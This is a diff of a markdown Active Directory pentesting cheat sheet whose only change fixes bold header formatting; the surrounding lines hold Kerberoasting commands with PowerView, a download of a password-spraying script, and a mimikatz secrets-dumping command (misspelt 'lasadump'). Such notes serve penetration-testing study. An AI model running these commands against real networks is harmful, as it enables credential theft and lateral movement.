@@ -151,14 +151,14 @@ Find Computers where Domain Users are Local Admin
 
 ### Lateral Movement 
 
-** Kerberoasting ** 
+**Kerberoasting** 
 ```
 Import-Module .\PowerView.ps1
 Get-DomainUser * -SPN |Select samaccountname
 Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 ```
 
-** Password Spraying**
+**Password Spraying**
 
 ```
 wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
@@ -167,7 +167,7 @@ tag:lateral-movement
 
 ```
 
-** Pillaging** 
+**Pillaging** 
 ```
 mimikatz.exe 
 lasadump::secrets
